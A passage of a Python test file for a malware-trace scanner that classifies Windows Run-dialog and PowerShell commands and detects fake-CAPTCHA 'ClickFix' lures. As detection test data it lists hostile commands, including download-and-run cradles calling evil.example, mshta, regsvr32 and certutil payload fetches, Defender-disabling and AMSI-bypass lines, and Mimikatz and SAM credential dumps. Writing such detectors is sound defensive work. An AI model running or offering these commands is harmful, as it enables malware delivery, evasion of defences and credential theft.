"""Tests for aegis.scanners.traces: the Run dialog / PowerShell / shell command classifiers (positive and negative cases,
including developer installers from well-known hosts), RunMRU, PSReadLine, bash, zsh and fish parsing, history grouping and
masking, the DNS cache check (fake PowerShell result, real threat-feed object) and browser history (real temporary SQLite
databases in the Chromium and Firefox layouts). Platform facts are injected or monkeypatched, so everything runs on Linux and
Windows. Secret-looking test strings are assembled at run time so this file never contains a contiguous token or webhook URL."""

import datetime as dt
import itertools
import json
import re
import sqlite3
import sys
from contextlib import closing
from pathlib import Path
from types import SimpleNamespace

import pytest

from aegis.core.models import Category, CheckResult, CheckStatus, Finding, Severity
from aegis.scanners import traces as tr
from aegis.scanners.base import REGISTRY, load_all

UTC = dt.timezone.utc
NOW = dt.datetime(2026, 10, 16, 12, 0, tzinfo=UTC)
IP = "93.184.216.34"  # a public address (the documentation ranges count as private)
RUNMRU = tr.RUNMRU_KEY


def rules(findings):
    return [f.rule_id for f in findings]


def split(out):
    out = list(out)
    return [x for x in out if isinstance(x, Finding)], [x for x in out if isinstance(x, CheckResult)]


def dump(items):
    return json.dumps([x.to_dict() for x in items])


def gh_token():
    return "ghp_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8"


def aws_key():
    return "AKIA" + "IOSFODNN7EXAMPLE"


def webhook_url():
    return "https://discord.com/api/" + "webhooks/" + "123456789012345678" + "/" + "aB3dE5gH7jK9mN1pQ3sT5vX7yZ2bC4dE6fG8"


def b64_payload(n=64):
    return ("SQBFAFgA" * n)[:n]


class FakeSigs:
    """What the scanner needs from SignatureDB (same label walk as SignatureDB.is_bad_domain)."""

    def __init__(self, domains=(), ips=()):
        self.bad_domains = {d.lower() for d in domains}
        self.bad_ips = set(ips)

    def is_bad_domain(self, domain):
        d = domain.lower().strip(".")
        while d:
            if d in self.bad_domains:
                return True
            if "." not in d:
                return False
            d = d.split(".", 1)[1]
        return False

    def is_bad_ip(self, ip):
        return ip in self.bad_ips


# =========================================================================== time conversion
def test_time_conversions_known_values():
    assert tr.webkit_to_datetime(13_350_000_000_000_000) == dt.datetime(2024, 1, 17, 21, 20, tzinfo=UTC)
    assert tr.unix_micros_to_datetime(1_760_000_000_000_000) == dt.datetime(2025, 10, 9, 8, 53, 20, tzinfo=UTC)
    assert tr.unix_to_datetime(1_760_000_000) == dt.datetime(2025, 10, 9, 8, 53, 20, tzinfo=UTC)
    for fn in (tr.webkit_to_datetime, tr.unix_micros_to_datetime, tr.unix_to_datetime):
        for bad in (0, None, -5, "x", True, 10 ** 30, 2 ** 70, 1):  # missing, negative, absurd and before-2000 values
            assert fn(bad) is None, (fn.__name__, bad)
    assert tr.unix_to_datetime(float("inf")) is None and tr.unix_to_datetime(float("nan")) is None


def test_time_round_trip():
    when = dt.datetime(2026, 9, 20, 8, 30, 15, tzinfo=UTC)
    assert tr.webkit_to_datetime(tr.datetime_to_webkit(when)) == when
    assert tr.unix_micros_to_datetime(tr.datetime_to_unix_micros(when)) == when


# =========================================================================== masking
def test_mask_command_hides_secrets_and_payloads():
    text = (f"curl -H 'Authorization: Bearer {gh_token()}' https://user:pa55w0rd@host.example/p?token=abcd1234&x=1 "
            f"--password hunter2xyz -u {aws_key()} {webhook_url()} powershell -enc {b64_payload()}")
    masked = tr.mask_command(text)
    for secret in (gh_token(), "pa55w0rd", "abcd1234", "hunter2xyz", aws_key(), "aB3dE5gH7jK9", b64_payload(), "SQBFAFgA"):
        assert secret not in masked, secret
    assert "host.example" in masked and "<base64 64 chars>" in masked and "x=1" in masked


@pytest.mark.parametrize("text,gone", [
    ("$password = 'hunter2xyz'; Connect-Thing", "hunter2xyz"),
    ("mysql -u root --password=hunter2xyz db", "hunter2xyz"),
    ("export API_KEY=Zk93jd82hf72hd91 && ./run", "Zk93jd82hf72hd91"),
    ("curl https://api.example/x?access_token=Zk93jd82hf72hd91", "Zk93jd82hf72hd91"),
    ("tool -Token Zk93jd82hf72hd91 -Name x", "Zk93jd82hf72hd91"),
])
def test_mask_command_keyed_secrets(text, gone):
    assert gone not in tr.mask_command(text)


def test_mask_command_leaves_ordinary_text_alone():
    for text in ("cd /home/user/projects/myproject/scripts/deploy-things && ./go",
                 r"copy C:\Users\bob\Documents\VeryLongFolderName\AnotherVeryLongFolderName\file.txt D:\x",
                 "powershell -w h -nop -c \"iex(irm https://evil.example/a)\" # I am not a robot",
                 "git commit -m 'fix passthru handling' --author x"):
        assert tr.mask_command(text) == text


def test_mask_command_masks_before_it_cuts():
    text = "x " * 190 + "--password S3cretValue123456 " + "y " * 50  # the secret sits just before the cut
    masked = tr.mask_command(text, 400)
    assert len(masked) <= 400 and "S3cret" not in masked and masked.endswith("...")
    short = tr.mask_command("a " * 500, 100)
    assert len(short) == 100 and short.endswith("...")


def test_mask_command_flattens_whitespace_and_control_characters():
    assert tr.mask_command("echo  a\tb\r\nc\x00d") == "echo a b c d"


def test_strip_url_removes_credentials_query_and_fragment():
    assert tr.strip_url("https://user:pw@evil.example:8443/a/b.exe?token=1&x=2#frag") == "https://evil.example:8443/a/b.exe"
    assert tr.strip_url("HTTP://Evil.Example/Path?q=1") == "http://evil.example/Path"
    assert tr.strip_url("http://[2001:db8::1]/x?q") == "http://[2001:db8::1]/x"
    assert tr.strip_url("https://evil.example") == "https://evil.example"
    assert tr.strip_url("https://evil.example/" + "a" * 300).endswith("...")
    for bad in ("javascript:alert(1)", "chrome://settings", "file:///etc/passwd", "", "http://", "http://[bad"):
        assert tr.strip_url(bad) == "", bad


# =========================================================================== well-known installer allow-list
@pytest.mark.parametrize("host,path,trusted", [
    ("community.chocolatey.org", "/install.ps1", True),
    ("chocolatey.org", "", True),
    ("get.scoop.sh", "", True),
    ("astral.sh", "/uv/install.ps1", True),
    ("aka.ms", "/install-powershell.ps1", True),
    ("dot.net", "/v1/dotnet-install.ps1", True),
    ("deno.land", "/install.ps1", True),
    ("bun.sh", "/install.ps1", True),
    ("sh.rustup.rs", "", True),
    ("get.docker.com", "", True),
    ("www.chocolatey.org", "", True),  # a sub-domain of a host the project controls
    ("ASTRAL.SH.", "/x", True),
    ("raw.githubusercontent.com", "/PowerShell/PowerShell/master/tools/install-powershell.ps1", True),
    ("raw.githubusercontent.com", "/ScoopInstaller/Install/master/install.ps1", True),
    # anyone can publish on GitHub raw: only named owners / repositories count
    ("raw.githubusercontent.com", "/attacker/repo/main/a.ps1", False),
    ("raw.githubusercontent.com", "/PowerShell/PowerShell-evil/main/a.ps1", False),
    ("astral.sh.evil.example", "", False),
    ("notastral.sh", "", False),
    ("evil.example", "/astral.sh/uv/install.ps1", False),
    ("", "", False),
])
def test_is_trusted_installer(host, path, trusted):
    assert tr.is_trusted_installer(host, path) is trusted


def test_fetch_addresses_gives_one_entry_per_fetching_call():
    assert tr.fetch_addresses("iwr https://Astral.sh/uv/install.ps1 | iex") == [("astral.sh", "/uv/install.ps1")]
    assert tr.fetch_addresses("irm get.scoop.sh | iex") == [("get.scoop.sh", "")]
    assert tr.fetch_addresses("iwr -useb get.scoop.sh/x | iex") == [("get.scoop.sh", "/x")]
    assert tr.fetch_addresses("Invoke-RestMethod -Uri 'https://astral.sh/uv/install.ps1' | Invoke-Expression") \
        == [("astral.sh", "/uv/install.ps1")]
    assert tr.fetch_addresses("irm 203.0.113.9/a | iex") == [("203.0.113.9", "/a")]
    assert tr.fetch_addresses("iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))") \
        == [("community.chocolatey.org", "/install.ps1")]
    assert tr.fetch_addresses('iex "& { $(irm https://aka.ms/install-powershell.ps1) } -UseMSI"') == [("aka.ms", "/install-powershell.ps1")]
    assert tr.fetch_addresses("iwr https://astral.sh/a | iex; irm https://evil.example/b | iex") == [
        ("astral.sh", "/a"), ("evil.example", "/b")]
    assert tr.fetch_addresses("iwr https://astral.sh@evil.example/x") == [("evil.example", "/x")]  # the user-info trick
    for variable in ("iex (irm $url)", "iwr $u | iex", "irm ($a + $b) | iex", "iex (irm (Get-Content u.txt))", "irm | iex"):
        assert tr.fetch_addresses(variable) == [None], variable
    assert tr.fetch_addresses("git status") == [] and tr.fetch_addresses("") == []


@pytest.mark.parametrize("command,trusted", [
    ("iwr https://astral.sh/uv/install.ps1 | iex", True),
    ("irm get.scoop.sh | iex", True),
    ("iwr -useb get.scoop.sh | iex", True),
    ("iwr -useb https://dot.net/v1/dotnet-install.ps1 -OutFile dotnet-install.ps1", True),
    ("iex \"& { $(irm https://aka.ms/install-powershell.ps1) } -UseMSI\"", True),
    ("Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = "
     "[System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString("
     "'https://community.chocolatey.org/install.ps1'))", True),
    ("iwr https://astral.sh@evil.example/x.ps1 | iex", False),  # user-info trick: the host is evil.example
    ("iwr https://astral.sh.evil.example/x.ps1 | iex", False),
    ("iwr https://evil.example/x.ps1 | iex", False),
    ("iex (irm $url)", False),  # no address to vouch for
    ("iex (irm https://evil.example/x) # https://astral.sh/uv/install.ps1", False),  # a trusted address elsewhere is no alibi
    ("iex (irm $u); irm https://astral.sh/uv/install.ps1 | iex", False),  # one trusted call does not vouch for another
    ("irm https://astral.sh/uv/install.ps1 | iex; irm https://evil.example/x | iex", False),
    ("irm https://astral.sh/uv/install.ps1 | iex; irm $other | iex", False),
    ("iex (New-Object Net.WebClient).OpenRead('https://astral.sh/x')", False),  # no recognised fetch call: not vouched for
    ("git status", False),
])
def test_downloads_only_from_trusted(command, trusted):
    assert tr.downloads_only_from_trusted(command) is trusted


# =========================================================================== fake-CAPTCHA lure text
@pytest.mark.parametrize("text,comment", [
    ('powershell -c "iex(irm https://x.example/a)"  # I am not a robot - reCAPTCHA Verification ID: 1234',
     "# I am not a robot - reCAPTCHA Verification ID: 1234"),
    ('mshta https://x.example/c.hta # ✅ "I am not a robot - Cloudflare Ray ID: 8d2f"',
     '# ✅ "I am not a robot - Cloudflare Ray ID: 8d2f"'),
    ("cmd /c something #verification", "#verification"),
    ("cmd /c something & rem Verify you are human", "rem Verify you are human"),
    ("powershell -c x # Cloudflare Turnstile", "# Cloudflare Turnstile"),
    ("powershell -c x # Human verification complete", "# Human verification complete"),
    ("powershell -c x # \u2714 Human check passed", "# \u2714 Human check passed"),
    ("cmd /c a # note # I am not a robot", "# I am not a robot"),  # the comment the lure words sit in
    ("powershell -c \"x\"#I am human", "\"#I am human"),
])
def test_find_lure_positive(text, comment):
    assert tr.find_lure(text) == comment


@pytest.mark.parametrize("text", [
    "https://example.com/#verification",  # a URL fragment is not a comment
    "notepad C:\\docs\\verification.txt",
    "notepad C:\\docs\\recaptcha-notes.txt",
    "powershell -c Get-Date",
    "powershell -c Get-Date # show the date",  # a comment without lure words
    "# I am not a robot",  # nothing runs before the comment
    "   # verification",
    "cmd /c echo robot",
    "",
])
def test_find_lure_negative(text):
    assert tr.find_lure(text) == ""


# =========================================================================== Run dialog commands
CLICKFIX_LURE = 'powershell -w h -nop -c "iex(irm https://evil.example/a)"  # I am not a robot - reCAPTCHA Verification ID: 1234'

RUN_POSITIVE = [
    # (command, severity, key that must be among the reasons)
    (CLICKFIX_LURE, "CRITICAL", "cradle"),
    ('mshta https://evil.example/c.hta # \u2705 "I am not a robot - Cloudflare Ray ID: 8d2f"', "CRITICAL", "mshta-url"),
    ('powershell -c "calc"   # I am not a robot', "HIGH", None),  # the lure alone
    ("cmd /c echo hi # reCAPTCHA", "HIGH", None),
    ('powershell -w hidden -nop -c "iex(irm https://evil.example/a)"', "HIGH", "cradle"),
    ("powershell.exe -ExecutionPolicy Bypass -c iwr https://evil.example/a.ps1 | iex", "HIGH", "cradle"),
    ("pwsh -c \"(New-Object Net.WebClient).DownloadString('https://evil.example/a')|IEX\"", "HIGH", "cradle"),
    ("powershell iwr https://evil.example/x.exe -OutFile x.exe", "HIGH", "ps-web"),
    ("powershell -enc " + b64_payload(80), "HIGH", "encoded"),
    ("powershell -EncodedCommand " + b64_payload(80), "HIGH", "encoded"),
    ("powershell -ec " + b64_payload(80), "HIGH", "encoded"),
    ("powershell -w hidden -nop -File C:\\scripts\\a.ps1", "HIGH", "hidden-stealth"),
    ("powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\scripts\\a.ps1", "HIGH", "hidden-stealth"),
    ("powershell -w hidden -File C:\\scripts\\a.ps1", "MEDIUM", "hidden"),
    ("mshta https://evil.example/c.hta", "HIGH", "mshta-url"),
    ("mshta.exe vbscript:Execute(\"x\")(window.close)", "HIGH", "mshta-url"),
    ("mshta \\\\evil.example\\share\\c.hta", "HIGH", "mshta-url"),
    ("cmd /c curl -s https://evil.example/a.bat -o %temp%\\a.bat && %temp%\\a.bat", "HIGH", "download-tool"),
    ("cmd.exe /c certutil -urlcache -f https://evil.example/a.exe %temp%\\a.exe", "HIGH", "download-tool"),
    ("cmd /k bitsadmin /transfer j https://evil.example/a.exe %temp%\\a.exe", "HIGH", "download-tool"),
    ("curl -s https://evil.example/a.bat -o %temp%\\a.bat && %temp%\\a.bat", "HIGH", "download-tool"),
    ("curl https://evil.example/a.cmd | cmd", "HIGH", "download-tool"),
    ("rundll32 \\\\evil.example\\share\\x.dll,Entry", "HIGH", "rundll32-remote"),
    ("rundll32.exe https://evil.example/x.dll,Entry", "HIGH", "rundll32-remote"),
    ("regsvr32 /s /n /u /i:https://evil.example/x.sct scrobj.dll", "HIGH", "regsvr32-remote"),
    ("regsvr32 \\\\evil.example\\share\\x.dll", "HIGH", "regsvr32-remote"),
    ("conhost --headless powershell -c calc", "HIGH", "conhost-headless"),
    ("conhost.exe 0xffffffff --headless cmd /c x", "HIGH", "conhost-headless"),
    ("msiexec /i https://evil.example/a.msi /qn", "HIGH", "msiexec-remote"),
    ("msiexec /q /i https://evil.example/a.msi", "HIGH", "msiexec-remote"),
    ("cmd /c finger user@evil.example | cmd", "HIGH", "finger"),
    ("finger.exe x@203.0.113.9", "HIGH", "finger"),
    ("p^owershell -w h -c iex(irm https://evil.example/q)", "HIGH", "cradle"),  # cmd.exe caret escapes are undone
    ("POWERSHELL -W H -NOP -C IEX(IRM https://EVIL.example/q)", "HIGH", "cradle"),
    # anything else the shared analysers rate MEDIUM or more is reported as MEDIUM in the Run box
    ("wevtutil cl security", "MEDIUM", None),
    ("net user bob /add", "MEDIUM", None),
    ("wmic process call create calc", "MEDIUM", None),
]


@pytest.mark.parametrize("command,severity,key", RUN_POSITIVE)
def test_classify_run_command_positive(command, severity, key):
    v = tr.classify_run_command(command)
    assert v is not None, command
    assert v.severity.name == severity, (command, v.severity.name, v.keys)
    if key:
        assert key in v.keys, (command, v.keys)
    assert v.reasons and all(isinstance(r, str) and r for r in v.reasons)


RUN_NEGATIVE = [
    "notepad", "cmd", "regedit", "calc", "control", "services.msc", "explorer", "mstsc /v:server", "cmd /k cd /d C:\\x",
    "https://example.com", "https://example.com/#verification", "www.example.com", "C:\\Users\\bob\\Documents",
    "msconfig", "netplwiz", "shell:startup", "%temp%", "ms-settings:windowsupdate", "control userpasswords2", "wt", "eventvwr",
    "cmd /c \"start https://google.com\"", "rundll32.exe sysdm.cpl,EditEnvironmentVariables", "ipconfig /flushdns",
    "rundll32 shell32.dll,Options_RunDLL 0", "msiexec /x {12345678-1234-1234-1234-123456789012}", "winget install Git.Git",
    "powershell -NoExit -Command \"cd 'D:\\Projects'\"", "powershell Start-Process notepad -Verb RunAs",
    "powershell -Command \"Get-Service | Where-Object Status -eq Running\"", "taskkill /f /im chrome.exe",
    "certutil -hashfile C:\\file.iso SHA256", "bitsadmin /list /allusers", "ssh user@host", "net use Z: \\\\server\\share",
    "\"C:\\Program Files\\Notepad++\\notepad++.exe\" C:\\x.txt", "chrome --incognito https://example.com",
    "\\\\server\\share", "\\\\server\\share\\folder\\file.txt", "notepad C:\\docs\\verification.txt", "powershell", "pwsh",
    "powershell -noexit", "powershell -NoProfile", "powershell Get-Process", "powershell -c \"Get-Date\"",
    "powershell -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1", "cmd /c ipconfig /all", "cmd /c dir",
    "curl https://example.com", "msiexec /i C:\\setup\\a.msi", "regsvr32 C:\\Windows\\System32\\vbscript.dll",
    "rundll32 shell32.dll,Control_RunDLL", "conhost", "finger", "notepad # note to self", "cmd /c echo hi # hello",
    # developers pasting the documented installers of well-known tools
    "powershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"",
    "powershell -c \"irm get.scoop.sh | iex\"",
    "powershell -c \"iwr -useb https://community.chocolatey.org/install.ps1 | iex\"",
    "",
    "ab",
]


@pytest.mark.parametrize("command", RUN_NEGATIVE)
def test_classify_run_command_negative(command):
    assert tr.classify_run_command(command) is None, command


def test_a_lure_overrides_the_installer_allow_list():
    v = tr.classify_run_command('powershell -c "irm https://astral.sh/uv/install.ps1 | iex" # I am not a robot')
    assert v is not None and v.severity == Severity.CRITICAL


def test_installer_allow_list_only_covers_the_download_and_run_signals():
    v = tr.classify_run_command("powershell -w hidden -nop -c \"irm https://astral.sh/uv/install.ps1 | iex\"")
    assert v is not None and v.severity == Severity.HIGH and "hidden-stealth" in v.keys and "cradle" not in v.keys
    v = tr.classify_run_command("powershell -enc " + b64_payload(80) + " # https://astral.sh/uv/install.ps1")
    assert v is not None and "encoded" in v.keys


def test_run_verdict_carries_attack_ids():
    v = tr.classify_run_command(CLICKFIX_LURE)
    assert "T1204.004" in v.mitre and "T1059.001" in v.mitre and v.mitre[0] == "T1204.004"
    assert v.lure.startswith("#") and "robot" in v.lure
    assert "T1218.005" in tr.classify_run_command("mshta https://evil.example/c.hta").mitre
    assert "T1218.011" in tr.classify_run_command("rundll32 \\\\h.example\\s\\x.dll,E").mitre
    assert "T1218.010" in tr.classify_run_command("regsvr32 /i:https://h.example/x.sct scrobj.dll").mitre
    assert "T1218.007" in tr.classify_run_command("msiexec /i https://h.example/a.msi").mitre
    assert "T1105" in tr.classify_run_command("cmd /c finger u@h.example | cmd").mitre


def test_padding_cannot_push_a_payload_past_the_analysis_limit():
    padded = "powershell -w h -nop -c " + " " * 20000 + "\"iex(irm https://evil.example/a)\""
    v = tr.classify_run_command(padded)
    assert v is not None and v.severity == Severity.HIGH and "cradle" in v.keys
    assert tr.classify_powershell_line(padded) is not None
    assert tr.classify_unix_command("curl http://" + IP + "/x" + " " * 20000 + "| sh") is not None


def test_a_cradle_and_the_powershell_web_pattern_are_one_reason():
    v = tr.classify_run_command("powershell -c \"iwr https://evil.example/a | iex\"")
    assert v.keys == ["cradle"] and len(v.reasons) == 1 and "T1204.004" in v.mitre and "T1105" in v.mitre
    only = tr.classify_run_command("powershell iwr https://evil.example/x.exe -OutFile x.exe")
    assert only.keys == ["ps-web"]  # a download without a run is its own reason


# =========================================================================== PowerShell history lines
PS_POSITIVE = [
    ("iex (irm https://evil.example/a.ps1)", "HIGH", "cradle"),
    ("iwr https://evil.example/a.ps1 | iex", "HIGH", "cradle"),
    ("irm 203.0.113.9/a | iex", "HIGH", "cradle"),
    ("iex ((New-Object Net.WebClient).DownloadString('https://evil.example/a'))", "HIGH", "cradle"),
    ("iex (iwr https://raw.githubusercontent.com/attacker/x/main/a.ps1)", "HIGH", "cradle"),
    ("iwr https://astral.sh.evil.example/x.ps1 | iex", "HIGH", "cradle"),
    ("powershell -enc " + b64_payload(80), "HIGH", "encoded"),
    ("pwsh -w hidden -nop -c \"iex(irm https://evil.example/a)\"", "HIGH", "hidden-stealth"),
    ("powershell iwr http://evil.example/a.exe -OutFile $env:TEMP\\a.exe; Start-Process $env:TEMP\\a.exe", "HIGH", "ps-web"),
    ("powershell -nop -c \"iwr https://evil.example/x\"", "HIGH", "ps-web"),
    ("powershell -c \"$u='http://evil.example/a';Invoke-WebRequest $u -OutFile $env:TEMP\\a.ps1;& $env:TEMP\\a.ps1\"", "HIGH",
     "ps-web"),
    ("powershell -w h -nop -c \"iex(irm https://evil.example/a)\"  # I am not a robot", "CRITICAL", "cradle"),
    ("mshta https://evil.example/c.hta", "HIGH", "mshta-url"),
    ("cmd /c curl -s https://evil.example/a.bat -o a.bat", "HIGH", "download-tool"),
    ("Set-MpPreference -DisableRealtimeMonitoring $true", "HIGH", "defender"),
    ("Set-MpPreference -DisableIntrusionPreventionSystem $true", "HIGH", "defender"),
    ("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f", "HIGH", "defender"),
    ("Add-MpPreference -ExclusionPath \"C:\\Users\\Public\"", "HIGH", "defender"),
    ("Add-MpPreference -ExclusionPath $env:TEMP", "HIGH", "defender"),
    ("Add-MpPreference -ExclusionExtension \".exe\"", "HIGH", "defender"),
    ("Add-MpPreference -ExclusionProcess \"powershell.exe\"", "HIGH", "defender"),
    ("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')"
     ".SetValue($null,$true)", "HIGH", "amsi"),
    ("Invoke-Mimikatz -DumpCreds", "CRITICAL", "credentials"),
    ("sekurlsa::logonpasswords", "CRITICAL", "credentials"),
    ("rundll32 comsvcs.dll, MiniDump 624 C:\\x.dmp full", "CRITICAL", "credentials"),
    ("reg save HKLM\\SAM C:\\sam.hive", "HIGH", "credentials"),
]


@pytest.mark.parametrize("line,severity,key", PS_POSITIVE)
def test_classify_powershell_line_positive(line, severity, key):
    v = tr.classify_powershell_line(line)
    assert v is not None, line
    assert v.severity.name == severity, (line, v.severity.name, v.keys)
    assert key in v.keys, (line, v.keys)


PS_NEGATIVE = [
    "Get-ChildItem C:\\src", "git status", "cd C:\\src\\aegis", "python -m pytest -q", "ls", "cls", "exit", "code .",
    "Get-Process | Where-Object CPU -gt 10 | Sort-Object CPU -Descending", "Get-Help Invoke-Expression", "$PSVersionTable",
    "Get-MpPreference", "Get-MpComputerStatus", "Set-MpPreference -DisableRealtimeMonitoring $false",
    # routine administration the shared command-line analyser flags elsewhere is not reported from a history
    "net user bob /add", "wevtutil cl security", "schtasks /create /tn x /tr C:\\x.exe /sc daily",
    # ordinary day-to-day PowerShell
    "Get-Content app.log -Tail 50 -Wait", "Invoke-WebRequest -Uri https://api.example/v1/items -Method POST -Body $json",
    "Invoke-RestMethod https://api.github.com/repos/x/y | ConvertTo-Json", "iex $cmd", "Get-Content x.ps1 | iex",
    "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser", "Start-Process powershell -Verb RunAs", "pwsh -NoProfile -c Get-Date",
    "powershell -nop -c \"Get-Process\"", "Install-Module PSReadLine -Force", "Set-MpPreference -SubmitSamplesConsent NeverSend",
    "Start-MpScan -ScanType QuickScan", "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "[Convert]::ToBase64String([IO.File]::ReadAllBytes('a.bin')) | Set-Clipboard", "powershell -EncodedCommand $enc",
    "curl.exe -L https://example.com -o a.zip", "iwr https://example.com/a.zip -OutFile a.zip; Expand-Archive a.zip",
    # a plain web request or download is not download-and-run
    "iwr https://example.com/file.zip -OutFile file.zip", "Invoke-RestMethod https://api.example/health",
    "pwsh -c \"irm https://api.example/health\"", "curl https://example.com -o x.html",
    "powershell -w hidden -File C:\\scripts\\a.ps1",  # hidden window alone: MEDIUM in the Run box, not reported from a history
    # documented installers from well-known hosts
    "iwr https://astral.sh/uv/install.ps1 | iex", "irm https://astral.sh/uv/install.ps1 | iex", "irm get.scoop.sh | iex",
    "powershell -ep bypass -c \"irm https://astral.sh/uv/install.ps1 | iex\"",
    "iwr -useb get.scoop.sh | iex", "irm https://community.chocolatey.org/install.ps1 | iex",
    "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = "
    "[System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString("
    "'https://community.chocolatey.org/install.ps1'))",
    "iex \"& { $(irm https://aka.ms/install-powershell.ps1) } -UseMSI\"",
    "iwr -useb https://dot.net/v1/dotnet-install.ps1 -OutFile dotnet-install.ps1",
    "irm bun.sh/install.ps1 | iex", "irm https://deno.land/install.ps1 | iex",
    "iex (iwr https://raw.githubusercontent.com/PowerShell/PowerShell/master/tools/install-powershell.ps1)",
    # a narrow Defender exclusion for a build folder is routine
    "Add-MpPreference -ExclusionPath C:\\Dev\\myproject\\build", "Add-MpPreference -ExclusionExtension \".vhdx\"",
    "Add-MpPreference -ExclusionPath 'D:\\VMs'",
]


@pytest.mark.parametrize("line", PS_NEGATIVE)
def test_classify_powershell_line_negative(line):
    assert tr.classify_powershell_line(line) is None, line


def test_history_and_run_use_the_same_signals_with_different_severities():
    assert tr.classify_run_command("net user bob /add").severity == Severity.MEDIUM
    assert tr.classify_powershell_line("net user bob /add") is None
    assert tr.classify_run_command("powershell -w hidden -File x.ps1").severity == Severity.MEDIUM
    assert tr.classify_powershell_line("powershell -w hidden -File x.ps1") is None
    assert tr.classify_run_command("powershell -c \"irm https://api.example/x\"").severity == Severity.HIGH
    assert tr.classify_powershell_line("powershell -c \"irm https://api.example/x\"") is None


# =========================================================================== 1. RunMRU parsing
def test_parse_runmru_orders_by_mrulist_and_strips_the_suffix():
    entries = tr.parse_runmru({"a": "notepad\\1", "b": "cmd /c ipconfig\\1", "c": "regedit\\1", "MRUList": "cab"})
    assert [(e.name, e.command, e.position) for e in entries] == [
        ("c", "regedit", 1), ("a", "notepad", 2), ("b", "cmd /c ipconfig", 3)]


def test_parse_runmru_tolerates_odd_data():
    values = {"a": "notepad\\1", "b": "", "c": "\\1", "d": "calc", "e": 5, "g": None,
              "f": ("cmd /c x\\1").encode("utf-16-le") + b"\x00\x00", "MRUList": "zfa", "1": "digit", "ab": "two letters",
              "(Default)": "x"}
    got = [(e.name, e.command) for e in tr.parse_runmru(values)]
    assert got == [("f", "cmd /c x"), ("a", "notepad"), ("d", "calc")]  # MRUList order, then the unlisted value
    assert tr.parse_runmru({}) == [] and tr.parse_runmru({"MRUList": "abc"}) == []
    assert tr.parse_runmru({"A": "calc\\1", "mrulist": "a"})[0].command == "calc"  # names are case-insensitive


def test_parse_runmru_without_a_list_uses_alphabetical_order():
    assert [e.name for e in tr.parse_runmru({"c": "x1\\1", "a": "x2\\1", "b": "x3\\1"})] == ["a", "b", "c"]


def test_parse_runmru_keeps_a_command_that_only_ends_like_the_suffix():
    assert tr.parse_runmru({"a": "echo \\11\\1", "MRUList": "a"})[0].command == "echo \\11"


# =========================================================================== 1. Run dialog findings
def make_entry(command=CLICKFIX_LURE, name="b", position=1):
    return tr.RunEntry(name, command, position)


def test_run_finding_for_a_clickfix_command():
    entry = make_entry()
    f = tr.run_finding(entry, tr.classify_run_command(entry.command), NOW)
    assert f.rule_id == "AEG-TRACE-RUNMRU" and f.severity == Severity.CRITICAL and f.category == Category.SUSPICIOUS
    assert f.title == "A fake-CAPTCHA (ClickFix) command was run from the Windows Run dialog"
    assert f.location.startswith("HKCU\\" + RUNMRU + "\\b#") and re.fullmatch(r"[0-9a-f]{8}", f.location.rsplit("#", 1)[1])
    assert f.mitre[0] == "T1204.004" and "T1059.001" in f.mitre
    assert "2026-10-16 12:00 UTC" in f.description and "the most recent command" in f.description
    assert "Win+R" in f.description and "No genuine CAPTCHA" in f.description
    ev = f.evidence
    assert ev["value_name"] == "b" and ev["position"] == 1 and ev["last_registry_write"] == "2026-10-16T12:00:00+00:00"
    assert "irm https://evil.example/a" in ev["command"] and "robot" in ev["lure_text"] and ev["reasons"]
    json.dumps(f.to_dict())


def test_run_finding_remediation_is_never_a_registry_delete():
    """Deleting the Run entry hides the record; it does not fix an infection, so it is never offered as the fix."""
    for command, position in ((CLICKFIX_LURE, 1), ("mshta https://evil.example/c.hta", 2), ("net user bob /add", 3)):
        f = tr.run_finding(make_entry(command, "c", position), tr.classify_run_command(command), NOW)
        assert f.remediation is None
        text = f.recommendation
        assert "regedit" in text and "RunMRU" in text and ("is not a fix" in text or "only hides" in text)
        assert "clean device" in text and "full Aegis scan" in text and "network" in text


def test_run_finding_titles_follow_the_severity():
    cases = [
        (CLICKFIX_LURE, "A fake-CAPTCHA (ClickFix) command was run from the Windows Run dialog"),
        ('powershell -c "calc" # I am not a robot', "A command with fake human-verification text was run from the Windows Run dialog"),
        ("mshta https://evil.example/c.hta", "A download or hidden-execution command was run from the Windows Run dialog"),
        ("net user bob /add", "An unusual command was run from the Windows Run dialog"),
    ]
    for command, title in cases:
        assert tr.run_finding(make_entry(command), tr.classify_run_command(command), None).title == title


def test_run_finding_location_is_stable_and_binds_the_command():
    a = tr.run_finding(make_entry(), tr.classify_run_command(CLICKFIX_LURE), NOW)
    b = tr.run_finding(make_entry(), tr.classify_run_command(CLICKFIX_LURE), NOW + dt.timedelta(days=3))
    assert a.location == b.location and a.fingerprint == b.fingerprint  # no time stamp in the identity
    other = "mshta https://evil.example/c.hta"
    c = tr.run_finding(make_entry(other), tr.classify_run_command(other), NOW)
    assert c.fingerprint != a.fingerprint  # a different command in the same slot is a different finding
    assert not re.search(r"\d{4}-\d\d-\d\d", a.location)


def test_run_finding_times_only_for_the_most_recent_command():
    cmd = "mshta https://evil.example/c.hta"
    first = tr.run_finding(make_entry(cmd, "a", 1), tr.classify_run_command(cmd), NOW)
    older = tr.run_finding(make_entry(cmd, "a", 4), tr.classify_run_command(cmd), NOW)
    assert "2026-10-16" in first.description and first.evidence["last_registry_write"]
    assert "2026-10-16" not in older.description and older.evidence["last_registry_write"] is None
    assert "command number 4" in older.description and "no time for individual Run commands" in older.description


def test_run_finding_masks_secrets_in_the_command():
